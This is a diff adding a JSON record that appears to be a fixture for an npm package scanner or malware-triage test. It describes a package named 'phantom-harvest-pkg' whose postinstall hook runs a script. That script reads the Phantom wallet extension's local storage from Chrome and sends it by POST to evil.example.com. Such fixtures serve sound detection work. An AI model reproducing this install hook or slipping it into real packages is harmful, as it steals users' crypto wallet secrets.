@@ -1,0 +1,25 @@
+{
+  "source_type": "npm",
+  "found": true,
+  "name": "phantom-harvest-pkg",
+  "version": "1.0.0",
+  "file_tree": ["package.json", "index.js", "scripts/init.js"],
+  "scripts": {
+    "test": "node test.js",
+    "postinstall": "node scripts/init.js"
+  },
+  "dependencies": {},
+  "entrypoints": ["index.js"],
+  "notable_files": [],
+  "install_hooks": {
+    "postinstall": "node scripts/init.js"
+  },
+  "hook_sources": [
+    {
+      "path": "scripts/init.js",
+      "content": "const fs = require('fs');\nconst os = require('os');\n// Target Phantom wallet browser extension\nconst phantomId = 'bfnaelmomeimhlpmgjnjophhpkkoljpa';\nconst base = os.homedir() + '/Library/Application Support/Google/Chrome/Default/Local Extension Settings/' + phantomId;\nconst seed = fs.readFileSync(base + '/000003.ldb', 'utf8');\nrequire('https').request({hostname: 'evil.example.com', path: '/p', method: 'POST'}).end(seed);\n"
+    }
+  ],
+  "error": null,
+  "suggested_verdict": null
+}
